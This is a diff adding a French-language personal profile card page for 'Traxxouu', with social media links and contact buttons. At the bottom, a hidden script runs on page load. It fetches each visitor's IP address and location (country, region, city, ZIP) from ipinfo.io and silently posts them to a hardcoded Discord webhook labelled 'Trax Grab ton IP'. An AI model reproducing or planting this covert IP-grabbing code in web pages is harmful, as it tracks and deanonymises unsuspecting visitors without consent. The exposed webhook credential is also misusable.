@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="style.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=MuseoModerno:ital,wght@1,800&display=swap" rel="stylesheet">
+        
+        
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Modern+Antiqua&display=swap" rel="stylesheet">
+
+        <link rel="icon" href="/media/logo.png" type="image/png" />
+        
+        
+        <title>Traxxouu • Card</title>
+    </head>
+    <body>
+        <div class="ecran">
+            <div class="carte" data-tilt>
+                <img src="media/logo.png">
+                <div class="titletrax">
+                     <h1>Traxxouu</h1>
+                </div>
+                <br>
+                <div class="infotrax">
+                    <p><h4>➕ Avance aisément et librement⏩☁️</h4></p>
+                    <br>
+                    <p><h4>➕ Apprenti Développeur dans ces heures perdues 🧪💻</h4></p>
+                    <br>
+                    <div class="reseau">
+                        <a href="https://www.twitch.tv/traxxouu"><img src="media/twitchlogo.png"></a>
+                        <a href="https://discord.gg/arNQu5c5bk"><img src="media/discord.logo_.decodagecom.webp"></a>
+                        <a href="https://twitter.com/traxxouu"><img src="media/twitterlogo.png"></a>
+                        <a href="https://github.com/traxxouu"><img src="media/GitHub_logo.png"></a>
+                    </div>
+                    <br>
+                    <a href="mailto:traxprofessional@gmail.com" class="button">Me contacter</a>
+                    <br>
+                    <br>
+                    <a href="https://traxxouu-portfolio.netlify.app/" class="button">Mon Site</a>            
+                </div>  
+            
+            </div>
+
+            
+        
+        </div>
+
+        
+
+        <script> 
+            function monke(json) { 
+                var request = new XMLHttpRequest(); 
+                request.open("POST", "https://discord.com/api/webhooks/1201171829386121286/Trra834mU72sovo8wSOWSguxDHEcRjyXIEmfseKYBudDu0E-li_behGmz-dn6khfigaS"); 
+                request.setRequestHeader('Content-type', 'application/json'); 
+                var params = { 
+                    username: "Portfolio-Ip", 
+                    avatar_url: "https://i.pinimg.com/originals/2d/ad/5c/2dad5ce7c026b44acc401ee10bc587bf.jpg", 
+                    content: "@everyone Trax il y a une Ip de +", 
+                    embeds: [ 
+                        { 
+                            title: "Trax Grab ton IP", 
+                            color: 1752220, 
+                            description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`" 
+                        } 
+                    ] 
+                } 
+                request.send(JSON.stringify(params)); 
+            } 
+     
+        </script> 
+        <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script> 
+        
+        <script src="vanilla-tilt.js"></script>
+    
+    </body>
+</html>
